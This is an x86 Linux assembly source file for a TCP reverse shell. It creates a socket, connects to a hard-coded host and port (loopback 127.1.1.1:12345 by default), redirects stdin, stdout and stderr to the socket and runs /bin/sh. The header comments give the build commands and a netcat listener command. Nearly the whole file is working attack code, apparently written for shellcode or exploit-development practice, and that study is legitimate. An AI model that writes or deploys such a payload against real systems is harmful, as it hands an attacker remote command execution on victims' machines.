; TCP Reverse shell for Linux x86 architecture
;  (@_Kiewicz)
; GPL License
; Defaults to localhost (127.1.1.1) and port 12345
;  
; $ nasm -f elf32 rev_shell.asm -o rev_shell.o
; $ ld -o rev_shell rev_shell.o
; nc -vl 12345
; ./rev_shell  

global _start

section .text
_start:
	xor eax, eax		; zeroing out regs
	xor ebx, ebx
	xor ecx, ecx
	xor edx, edx
	xor esi, esi
	xor edi, edi
socket:
	; sockfd = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
 
  	mov ax, 0x167		; socket syscall
	mov bl, 0x2		; AF_INET
  	mov cl, 0x1		; SOCK_sTREAM
  	mov dl, 0x6		; IPPROTO_TCP
  	int 0x80		; interrupt to kernel

connect:
  	; remote_addr.sin_family = AF_INET; // ipv4
  	; remote_addr.sin_port = htons(RPORT); // port in the correct endianness
  	; remote_addr.sin_addr.s_addr = inet_addr(RHOST);

  	; connect(sockfd, (struct sockaddr*) &remote_addr, sizeof(remote_addr));

  	mov ebx, eax 		; socket file descr
	push dword 0x0101017f	; host 127.1.1.1
  	push word 0x3930 	; port 12345
  	push word 0x02 		; AF_INET

  	mov ecx, esp 		; pointer to struct
	mov ax, 0x16a		; syscall 362
  	mov dl, 0x10		; sizeof(sockaddr
  	int 0x80

dup2:
	; dup2(sockfd, 0); // stdin
  	; dup2(sockfd, 1); // stdout
  	; dup2(sockfd, 2); // stderr
  	xor ecx, ecx		; Clearing out ECX to initialize counter
  	mov cl, 0x2 		; stdin, stdout and stderr
	xor eax, eax
dup2_fd:
  	mov al, 0x3f		; syscall 63 
  	int 0x80 		
 	dec cl			; cl = cl - 1 			
  	jns dup2_fd		; jump back if not SF = 0

  
execve:
	; execve("/bin/sh", NULL, NULL);
  	xor ecx, ecx

	; We will push the string ‘//bin/sh 0x00 &addr 0x00’ (in reverse order)
	mov al, 0xb		; execve syscall = 11
	push esi		; NULL bytes
	push 0x68732f2f		; //sh
	push 0x6e69622f		; /bin
	mov ebx, esp		; address of //bin/sh string
	mov ecx, esi		; argv
	mov edx, esi		; envp
	int 0x80
